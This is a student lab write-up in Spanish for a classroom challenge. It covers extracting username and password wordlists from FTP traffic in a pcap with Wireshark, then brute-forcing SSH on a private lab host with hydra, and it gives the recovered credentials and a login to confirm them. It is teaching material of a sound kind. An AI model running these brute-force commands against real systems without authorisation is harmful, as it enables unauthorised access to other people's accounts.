# Reto NetworkChuck — Obtención de credenciales con Hydra

Joel Asensio

## 1. Objetivo

Conseguir el usuario y la contraseña de una máquina en la red usando wordlists con **hydra**.

## 2. Wireshark

Teníamos un archivo pcap como pista, aparte del vídeo de NetworkChuck.

En Wireshark filtramos por `ftp-data` para localizar las transferencias de archivos. Entre los paquetes se ven los `STOR password.txt` y `STOR usuarios.txt`, que son las dos wordlists que necesitamos.

![Paquetes ftp-data en Wireshark](../img/examen/wireshark.png)

Para extraer cada archivo, clic derecho sobre su paquete → **Seguir → TCP Stream**, y guardamos el contenido con el nombre correspondiente (`password.txt` y `usuarios.txt`).

![Descarga de password.txt](../img/examen/descargar_password.png)

![Descarga de usuarios.txt](../img/examen/descargar_usuario.png)

---

## 3. Hydra
Para saber el usuario y la contraseña que tiene tenemos que usar hydra, el comando que hemos usado es:

```
sudo hydra -L usuarios.txt -P password.txt 192.168.111.55 ssh
```

Esto hace que utilice el archivo usuarios.txt para adivinar el usuario y el archivo password.txt para adivinar la contraseña, esto daba error y he estado buscando y es porque con ssh por defecto lo hace con 16 hilos y da fallos de conexion, lo que se recomienda es bajarlo a 4 hilos con -t 4 al final del comando como este:

```
sudo hydra -L usuarios.txt -P password.txt -t 4 192.168.111.55 ssh
```

Como no nos funcionaba nos diste el usuario (`aladar`), al final hicimos fuerza bruta solo sobre la contraseña usando `-l` con el usuario fijo, que es el comando con el que conseguimos entrar:

```
sudo hydra -l "aladar" -P password.txt -t 4 192.168.111.55 ssh
```

---

## 4. Resultado

Hydra encuentra la contraseña válida en la salida:

```
[22][ssh] host: 192.168.111.55   login: aladar   password: mezga
```

![Ejecución de hydra y contraseña encontrada](../img/examen/hack.png)

Credenciales obtenidas:

- **Usuario:** `aladar`
- **Contraseña:** `mezga`

---

## 5. Verificación

Comprobamos que las credenciales funcionan conectándonos por SSH a la máquina:

```bash
ssh aladar@192.168.111.55
```

Después de aceptar el fingerprint e introducir la contraseña, accedemos a la máquina Debian. Como prueba de acceso hemos creado un archivo dentro de `Documents/SEGiAD/`:

```bash
touch joel_asensio
```

![Acceso por SSH y prueba de escritura](../img/examen/respuesta.png)

---
